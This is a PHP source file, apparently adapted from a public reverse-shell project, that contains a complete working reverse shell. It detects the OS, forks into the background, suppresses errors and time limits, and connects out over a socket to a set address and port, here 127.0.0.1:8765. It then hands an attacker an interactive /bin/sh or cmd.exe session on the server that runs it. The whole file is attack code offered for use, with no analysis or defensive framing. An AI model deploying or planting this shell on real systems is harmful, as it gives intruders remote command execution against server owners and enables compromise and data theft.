<?php
// Copyright (c) 2025 HM
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell_older.php
class Shell {
    var $addr  = null;
    var $port  = null;
    var $os    = null;
    var $shell = null;
    var $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    var $buffer = 1024;  // read/write buffer size
    var $clen   = 0;     // command length
    var $error  = false; // stream read/write error
    var $sdump  = true;  // script's dump

    function __construct($addr, $port) { // Corregido: utilizar __construct en lugar de function Shell
        $this->addr = $addr;
        $this->port = $port;
    }

    function detect() {
        $detected = true;
        $os = strtoupper(PHP_OS);
        if (strpos($os, 'LINUX') !== false || strpos($os, 'DARWIN') !== false) {
            $this->os    = 'LINUX';
            $this->shell = '/bin/sh';
        } else if (strpos($os, 'WINDOWS') !== false || strpos($os, 'WINNT') !== false || strpos($os, 'WIN32') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }

    function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exist, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }

    function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }

    function dump($data) {
        if ($this->sdump) {
            $data = str_replace('<', '&lt;', $data);
            $data = str_replace('>', '&gt;', $data);
            echo $data;
        }
    }

    function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { 
            $this->error = true; 
            echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
        }
        return $data;
    }

    function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { 
            $this->error = true; 
            echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
        }
        return $bytes;
    }

    function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); }
            $this->dump($data);
        }
    }

    function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data);
        }
    }

    function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false);
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false);
                    }
                    @fwrite($socket, "SOCKET: Shell has connected!\n");
                    do {
                        if (feof($socket)) {
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1])) {
                            echo "PROC_ERROR: Shell process has been terminated\n"; break;
                        }
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]),
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0);
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket, $streams['read'])) { $this->rw($socket, $pipes[0], 'SOCKET', 'STDIN'); }
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket, 'STDERR', 'SOCKET'); }
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket, 'STDOUT', 'SOCKET'); }
                            } else if ($this->os === 'WINDOWS') {
                                if (in_array($socket, $streams['read'])) { $this->rw($socket, $pipes[0], 'SOCKET', 'STDIN'); }
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket, 'STDERR', 'SOCKET'); }
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket, 'STDOUT', 'SOCKET'); }
                            }
                        }
                    } while (!$this->error);
                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                fclose($socket);
            }
        }
    }
}

echo '<pre>';
$sh = new Shell('127.0.0.1', 8765);
$sh->run();
unset($sh);
echo '</pre>';
?>
